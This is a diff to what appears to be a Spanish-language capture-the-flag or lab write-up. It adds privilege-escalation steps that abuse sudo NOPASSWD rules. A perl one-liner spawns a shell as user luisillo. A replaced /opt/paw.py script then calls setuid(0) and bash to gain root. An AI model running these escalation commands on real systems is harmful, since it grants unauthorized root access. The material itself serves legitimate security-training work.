@@ -59,9 +59,22 @@ Matching Defaults entries for vaxei on 00a5941544de:
 User vaxei may run the following commands on 00a5941544de:
     (luisillo) NOPASSWD: /usr/bin/perl
 
-https://www.youtube.com/watch?v=ux326VPrEpo
+
+sudo -u luisillo perl -e 'exec "/bin/bash";' -> para conectarnos como luisillo 
+
+User luisillo may run the following commands on 00a5941544de:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
 
 
+Podemos renombrar el archivo paw.py y crear otro nuevo que haga:
+
+luisillo@00a5941544de:/opt$ cat paw.py 
+import os
+
+os.setuid(0)
+os.system("bash")
+
+Y al ejecutarlo: sudo /usr/bin/python3 /opt/paw.py -> nos convertimos en root
 
 
 
